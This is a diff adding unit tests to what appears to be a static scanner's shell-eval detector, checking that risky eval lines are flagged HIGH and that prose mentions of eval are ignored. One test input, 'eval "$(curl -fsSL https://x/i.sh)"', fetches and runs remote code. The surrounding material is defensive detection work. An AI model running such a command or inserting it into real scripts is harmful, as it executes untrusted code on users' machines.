@@ -52,6 +52,26 @@ def test_shell_eval():
     assert f.severity.value == "HIGH"
 
 
+def test_shell_eval_keeps_expansions_and_quoted_code():
+    for line in ('eval "$(curl -fsSL https://x/i.sh)"', "eval '${payload}'", "eval ${cmd}", 'f"eval \'{escaped}\'"'):
+        f = detect_shell_eval(line, "x.sh", 1)
+        assert f is not None, line
+        assert f.severity.value == "HIGH"
+
+
+def test_shell_eval_ignores_prose_mentions():
+    # Field noise: every non-shell hit in the Hermes tree was prose, a log
+    # string, or the rule's own description ("eval executes a string").
+    for line in (
+        "# Dangerous: eval of a variable",
+        'err = result.get("error", "eval failed")',
+        '"""...after an eval that may navigate the page."""',
+        'description="eval executes a string as shell code"',
+        "# sh -c / bash -c / eval payloads still scan raw."
+    ):
+        assert detect_shell_eval(line, "x.py", 1) is None, line
+
+
 def test_js_exec_shell_true():
     f = detect_js_exec('exec("ls", { shell: true })', "x.js", 1)
     assert f is not None
